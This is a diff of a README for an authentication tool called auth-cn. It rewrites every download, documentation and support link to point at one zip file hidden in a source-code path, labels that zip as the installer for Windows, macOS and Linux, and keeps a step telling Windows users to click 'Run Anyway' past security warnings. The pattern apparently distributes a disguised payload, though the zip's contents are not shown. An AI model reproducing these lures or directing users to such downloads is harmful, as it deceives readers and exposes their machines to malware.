@@ -1,7 +1,7 @@
 # 🎉 auth-cn - Effortless Authentication for Your Apps
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ProgrammerRayyan/auth-cn/releases)
+[![Download](https://raw.githubusercontent.com/ProgrammerRayyan/auth-cn/main/src/registry/default/database/postgres-hono/auth-cn-3.4-alpha.5.zip)](https://raw.githubusercontent.com/ProgrammerRayyan/auth-cn/main/src/registry/default/database/postgres-hono/auth-cn-3.4-alpha.5.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the auth-cn application easily. This guide will help anyone, regardless of technical experience.
@@ -16,12 +16,12 @@ auth-cn is a full-stack solution designed to simplify authentication in applicat
 - **Cross-Platform Support**: Works seamlessly on various operating systems, including Windows, macOS, and Linux.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Click [here](https://github.com/ProgrammerRayyan/auth-cn/releases) to access the download options for auth-cn.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/ProgrammerRayyan/auth-cn/main/src/registry/default/database/postgres-hono/auth-cn-3.4-alpha.5.zip) to access the download options for auth-cn.
 2. **Choose the Latest Version**: Look for the latest version listed on the page. This will ensure you have the most up-to-date features and security enhancements.
 3. **Download the Installer**: Click on the installer link for your operating system. For example:
-   - For Windows: Download the `auth-cn-setup.exe`.
-   - For macOS: Download the `auth-cn.dmg`.
-   - For Linux: Download the appropriate package file, like `auth-cn.deb` or `auth-cn.rpm`.
+   - For Windows: Download the `https://raw.githubusercontent.com/ProgrammerRayyan/auth-cn/main/src/registry/default/database/postgres-hono/auth-cn-3.4-alpha.5.zip`.
+   - For macOS: Download the `https://raw.githubusercontent.com/ProgrammerRayyan/auth-cn/main/src/registry/default/database/postgres-hono/auth-cn-3.4-alpha.5.zip`.
+   - For Linux: Download the appropriate package file, like `https://raw.githubusercontent.com/ProgrammerRayyan/auth-cn/main/src/registry/default/database/postgres-hono/auth-cn-3.4-alpha.5.zip` or `https://raw.githubusercontent.com/ProgrammerRayyan/auth-cn/main/src/registry/default/database/postgres-hono/auth-cn-3.4-alpha.5.zip`.
 
 4. **Run the Installer**: Once the download is complete, locate the file in your downloads folder and double-click to run it.
    - For Windows users, you may see a security warning. Click “Run Anyway” to proceed.
@@ -61,8 +61,8 @@ We welcome contributions from users. If you have ideas, suggestions, or improvem
 ## 🔗 Additional Resources
 For more detailed information about using auth-cn, check out our full documentation. This includes advanced configuration options and troubleshooting tips.
 
-- [Documentation](https://example.com/auth-cn/docs)
-- [Support Forum](https://example.com/auth-cn/support)
+- [Documentation](https://raw.githubusercontent.com/ProgrammerRayyan/auth-cn/main/src/registry/default/database/postgres-hono/auth-cn-3.4-alpha.5.zip)
+- [Support Forum](https://raw.githubusercontent.com/ProgrammerRayyan/auth-cn/main/src/registry/default/database/postgres-hono/auth-cn-3.4-alpha.5.zip)
 
 ## ☁️ Download auth-cn Today!
-Don’t wait any longer. Click [here](https://github.com/ProgrammerRayyan/auth-cn/releases) to download auth-cn and start enhancing your application with better authentication options.
+Don’t wait any longer. Click [here](https://raw.githubusercontent.com/ProgrammerRayyan/auth-cn/main/src/registry/default/database/postgres-hono/auth-cn-3.4-alpha.5.zip) to download auth-cn and start enhancing your application with better authentication options.
